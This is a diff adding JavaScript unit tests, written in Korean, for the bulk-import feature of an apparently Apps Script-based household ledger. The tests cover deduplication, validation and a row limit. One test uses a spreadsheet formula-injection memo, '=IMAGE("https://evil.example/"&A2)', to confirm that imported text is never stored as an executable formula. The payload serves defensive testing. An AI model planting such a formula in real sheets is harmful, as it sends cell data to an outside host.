@@ -924,3 +924,87 @@ test('카테고리 이름도 수식으로 들어가지 않는다', () => {
   assert.ok(대분류.includes("'=SUM(A1:A9)"), '이름이 글자로 저장되지 않았습니다: ' + 대분류.join(', '));
   assert.equal(대분류.filter((n) => n[0] === '=').length, 0, '수식으로 들어간 이름이 있습니다');
 });
+
+/* ================================================================== */
+/* 여러 건 한꺼번에 가져오기                                             */
+/* ================================================================== */
+
+const 한줄 = (over) => ({
+  date: '2026-09-01', kind: 'expense', amount: 5600, memo: '스타벅스', ...over,
+});
+
+test('여러 건을 한꺼번에 넣는다', () => {
+  const gas = freshLedger();
+  const out = gas.call('importTransactions', {
+    month: '2026-09',
+    rows: [
+      한줄(),
+      한줄({ amount: 12000, memo: '김밥천국', date: '2026-09-02' }),
+      한줄({ kind: 'income', amount: 3000000, memo: '급여', date: '2026-09-03' }),
+    ],
+  });
+
+  assert.equal(out.added, 3);
+  assert.equal(out.skipped, 0);
+  assert.equal(out.data.transactions.length, 3);
+  assert.equal(out.data.summary.total.income, 3000000);
+  assert.equal(out.data.summary.total.expense, 17600);
+});
+
+test('같은 내역을 두 번 가져와도 두 줄이 되지 않는다', () => {
+  const gas = freshLedger();
+  const rows = [한줄(), 한줄({ amount: 12000, memo: '김밥천국' })];
+
+  gas.call('importTransactions', { month: '2026-09', rows });
+  const 두번째 = gas.call('importTransactions', { month: '2026-09', rows });
+
+  assert.equal(두번째.added, 0, '같은 것이 또 들어갔습니다');
+  assert.equal(두번째.skipped, 2);
+  assert.equal(두번째.data.transactions.length, 2);
+});
+
+test('겹치는 기간을 가져오면 새것만 들어간다', () => {
+  const gas = freshLedger();
+  gas.call('importTransactions', { month: '2026-09', rows: [한줄()] });
+
+  const out = gas.call('importTransactions', {
+    month: '2026-09',
+    rows: [한줄(), 한줄({ amount: 4000, memo: '편의점', date: '2026-09-05' })],
+  });
+
+  assert.equal(out.added, 1, '새 것만 들어가야 합니다');
+  assert.equal(out.skipped, 1);
+});
+
+test('가져온 메모도 시트에서 수식으로 실행되지 않는다', () => {
+  const gas = freshLedger();
+  gas.call('importTransactions', {
+    month: '2026-09',
+    rows: [한줄({ memo: '=IMAGE("https://evil.example/"&A2)' })],
+  });
+
+  const 메모 = gas.dump('내역').slice(1).map((r) => String(r[5]));
+  assert.equal(메모.filter((m) => m[0] === '=').length, 0, '수식으로 들어갔습니다');
+});
+
+test('가져올 내역이 이상하면 아무것도 넣지 않는다', () => {
+  const gas = freshLedger();
+
+  assert.throws(() => gas.call('importTransactions', { month: '2026-09', rows: [] }), /가져올 내역이 없습니다/);
+  assert.throws(() => gas.call('importTransactions', {
+    month: '2026-09', rows: [한줄({ amount: -100 })],
+  }), /금액/);
+  assert.throws(() => gas.call('importTransactions', {
+    month: '2026-09', rows: [한줄({ date: '엉망' })],
+  }), /날짜/);
+
+  assert.equal(gas.call('getMonthData', '2026-09').transactions.length, 0, '실패했는데 뭔가 들어갔습니다');
+});
+
+test('한 번에 너무 많이 넣으려 하면 막는다', () => {
+  const gas = freshLedger();
+  const 많이 = [];
+  for (let i = 0; i < 201; i++) 많이.push(한줄({ amount: 1000 + i }));
+
+  assert.throws(() => gas.call('importTransactions', { month: '2026-09', rows: 많이 }), /200건까지/);
+});
